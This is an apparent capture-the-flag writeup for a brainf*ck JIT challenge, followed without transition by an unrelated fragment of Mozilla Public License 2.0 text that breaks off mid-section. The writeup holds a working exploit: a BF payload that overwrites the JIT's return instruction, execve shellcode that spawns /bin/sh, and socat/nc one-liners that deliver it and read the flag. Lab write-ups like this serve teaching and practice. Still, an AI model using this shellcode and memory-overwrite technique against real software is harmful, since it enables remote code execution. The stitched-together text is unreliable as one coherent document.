Go and check it out!\n\nnc 172.17.0.2 31337\n```\n\nThe binaries or source code will not be provided with this problem.\n\n## Setup\n\n1. `docker build -t lejit .`\n2. `docker run --rm -d --read-only lejit`\n\n## Brief Dev Description\n\nJIT compiler for brainf*ck, but the execution tape shares a memory map with the memory tape.\n\n## Solution\n\nUsing your preferred shellcode (MUST be null-terminated):\n\n```shell script\n(echo \"<<<<<<<<<<<<<,[>,]\"; printf \"\\x50\\x48\\x31\\xD2\\x48\\x31\\xF6\\x48\\xBB\\x2F\\x62\\x69\\x6E\\x2F\\x2F\\x73\\x68\\x53\\x54\\x5F\\xB0\\x3B\\x0F\\x05\\x00\"; sleep 1; echo \"cat /root/flag.txt\") | socat - tcp-connect:172.17.0.2:31337\n```\n\n## Short Writeup\n\nWe begin by exploring the memory tape, which shortly concludes that there are entries already\nin the memory tape.\n\n```\n<.>  Go back, print, go forward\n```\n\nIn order to explore this further, we write a short script to iterate up the address space:\n\n```shell script\n# print last 100 and remove the prompt and welcome text\npython3 -c 'print(\"<\"*100+\".>\"*100)' | socat - tcp-connect:172.17.0.2:31337 | xxd -p -c1 | tail -n 105 | head -n 100 | xxd -p -r > mem.bin\n```\n\nAfter some iterations of this, it becomes clear that this contains some arbitrary data. Knowing\nthis is a JIT compiler, we try objdump:\n\n```shell script\nobjdump -D -b binary -mi386:x86-64 mem.bin\n```\n\nWhich shows some somewhat expected behaviour for brainfuck JIT:\n\n```text\n0000000000000000 <.data>:\n   0:\t74 24                \tje     0x26\n   2:\t38 48 89             \tcmp    %cl,-0x77(%rax)\n   5:\t54                   \tpush   %rsp\n   6:\t24 40                \tand    $0x40,%al\n   8:\t48 89 4c 24 48       \tmov    %rcx,0x48(%rsp)\n   d:\t48 b8 d0 8e ed 63 1a \tmovabs $0x561a63ed8ed0,%rax\n  14:\t56 00 00 \n  17:\tff d0                \tcallq  *%rax\n  19:\t48 8b 7c 24 30       \tmov    0x30(%rsp),%rdi\n  1e:\t48 8b 74 24 38       \tmov    0x38(%rsp),%rsi\n  23:\t48 8b 54 24 40       \tmov    0x40(%rsp),%rdx\n  28:\t48 8b 4c 24 48       \tmov    0x48(%rsp),%rcx\n  2d:\t3c 00                \tcmp    $0x0,%al\n  2f:\t0f 85 23 00 00 00    \tjne    0x58\n  35:\t48 81 c6 01 00 00 00 \tadd    $0x1,%rsi\n  3c:\t48 3b f1             \tcmp    %rcx,%rsi\n  3f:\t0f 82 07 00 00 00    \tjb     0x4c\n  45:\t48 81 ee 00 80 00 00 \tsub    $0x8000,%rsi\n  4c:\t48 c7 c0 00 00 00 00 \tmov    $0x0,%rax\n  53:\t48 83 c4 28          \tadd    $0x28,%rsp\n  57:\tc3                   \tretq   \n  58:\t48 c7 c0 01 00 00 00 \tmov    $0x1,%rax\n  5f:\t48 83 c4 28          \tadd    $0x28,%rsp\n  63:\tc3                   \tretq\n```\n\nFrom this, we can discern a few things:\n - `%rsi` is the tape pointer (as shown by instruction at 0x35 and given the script used)\n - A function is used to output the character under the pointer (instruction at 0x17)\n - It is likely that the instruction at 0x57 is the means by which the JIT function normally returns (`%rax` is linux\n calling convention for return value, which is set to 0 at 0x4c)\n\nBy this, we know to make an attack where we overwrite the standard return with our shellcode.\n\nThe following BF payload is used (with a newline terminator):\n\n```\n<<<<<<<<<<<<<,[>,]\n```\n\nThis moves back 13 (to retq) and overwrites it with input until encountering a null value.\n\n[This shellcode](https://www.exploit-db.com/exploits/42179) is used (note the null terminator):\n\n```\n\\x50\\x48\\x31\\xD2\\x48\\x31\\xF6\\x48\\xBB\\x2F\\x62\\x69\\x6E\\x2F\\x2F\\x73\\x68\\x53\\x54\\x5F\\xB0\\x3B\\x0F\\x05\\x00\n```\n\nFinally, these are combined to create our exploit:\n\n```shell script\n(echo \"<<<<<<<<<<<<<,[>,]\"; printf \"\\x50\\x48\\x31\\xD2\\x48\\x31\\xF6\\x48\\xBB\\x2F\\x62\\x69\\x6E\\x2F\\x2F\\x73\\x68\\x53\\x54\\x5F\\xB0\\x3B\\x0F\\x05\\x00\"; cat -) | nc 172.17.0.2 31337\n```\n\nWith our shell, we read the flag:\n\n```shell script\ncat /root/flag.txt\n```\n\nWith which we acquire the flag.\n\n## Possible Difficulty Enhancements\n\n - It is entirely possible to solve this challenge entirely without source code or binaries,\n   but if this proves to be too difficult, then we'll give them the binary.\n",

Distribution of Source Form\n\nAll distribution of Covered Software in Source Code Form, including any\nModifications that You create or to which You contribute, must be under\nthe terms of this License. You must inform recipients that the Source\nCode Form of the Covered Software is governed by the terms of this\nLicense, and how they can obtain a copy of this License. You may not\nattempt to alter or restrict the recipients' rights in the Source Code\nForm.\n\n3.2. Distribution of Executable Form\n\nIf You distribute Covered Software in Executable Form then:\n\n(a) such Covered Software must also be made available in Source Code\n    Form, as described in Section 3.1, and You must inform recipients of\n    the Executable Form how they can obtain a copy of such Source Code\n    Form by reasonable means in a timely manner, at a charge no more\n    than the cost of distribution to the recipient; and\n\n(b) You may distribute such Executable Form under the terms of this\n    License, or sublicense it under different terms, provided that the\n    license for the Executable Form does not attempt to limit or alter\n    the recipients' rights in the Source Code Form under this License.\n\n3.3. Distribution of a Larger Work\n\nYou may create and distribute a Larger Work under terms of Your choice,\nprovided that You also comply with the requirements of this License for\nthe Covered Software. If the Larger Work is a combination of Covered\nSoftware with a work governed by one or more Secondary Licenses, and the\nCovered Software is not Incompatible With Secondary Licenses, this\nLicense permits You to additionally distribute such Covered Software\nunder the terms of such Secondary License(s), so that the recipient of\nthe Larger Work may, at their option, further distribute the Covered\nSoftware under the terms of either this License or such Secondary\nLicense(s).\n\n3.4. Notices\n\nYou may not remove or alter the substance of any license notices\n(including copyright notices, patent notices, disclaimers of warranty,\nor limitations of liability) contained within the Source Code Form of\nthe Covered Software, except that You may alter any license notices to\nthe extent required to remedy known factual inaccuracies.\n\n3.5. Application of Additional Terms\n\nYou may choose to offer, and to charge a fee for, warranty, support,\nindemnity or liability obligations to one or more recipients of Covered\nSoftware. However, You may do so only on Your own behalf, and not on\nbehalf of any Contributor. You must make it absolutely clear that any\nsuch warranty, support, indemnity, or liability obligation is offered by\nYou alone, and You hereby agree to indemnify every Contributor for any\nliability incurred by such Contributor as a result of warranty, support,\nindemnity or liability terms You offer. You may include additional\ndisclaimers of warranty and limitations of liability specific to any\njurisdiction.\n\n4. Inability to Comply Due to Statute or Regulation\n---------------------------------------------------\n\nIf it is impossible for You to comply with any of the terms of this\nLicense with respect to some or all of the Covered Software due to\nstatute, judicial order, or regulation then You must: (a) comply with\nthe terms of this License to the maximum extent possible; and (b)\ndescribe the limitations and the code they affect. Such description must\nbe placed in a text file included with all distributions of the Covered\nSoftware under this License. Except to the extent prohibited by statute\nor regulation, such description must be sufficiently detailed for a\nrecipient of ordinary skill to be able to understand it.\n\n5. Termination\n--------------\n\n5.1. The rights granted under this License will terminate automatically\nif You fail to comply with any of its terms. However, if You become\ncompliant, then the rights granted under this License from a particular\nContributor are reinstated (a) provisionally, unless and until such\nContributor explicitly and finally terminates Your grants, and (b) on an\nongoing basis, if such Contributor fails to notify You of the\nnon-compliance by some reasonable means prior to 60 days after You have\ncome back into compliance. Moreover, Your grants from a particular\nContributor are reinstated on an ongoing basis if such Contributor\nnotifies You of the non-compliance by some reasonable means, this is the\nfirst time You have received notice of non-compliance with this License\nfrom such Contributor, and You become compliant prior to 30 days after\nYour receipt of the notice.\n\n5.2. If You initiate litigation against any entity by asserting a patent\ninfringement claim (excluding declaratory judgment actions,\ncounter-claims, and cross-claims) alleging that a Contributor Version\ndirectly or indirectly infringes any patent, then the rights granted to\nYou by any and all Contributors for the Covered Software under Section\n2.1 of this License shall terminate.\n\n5.3.
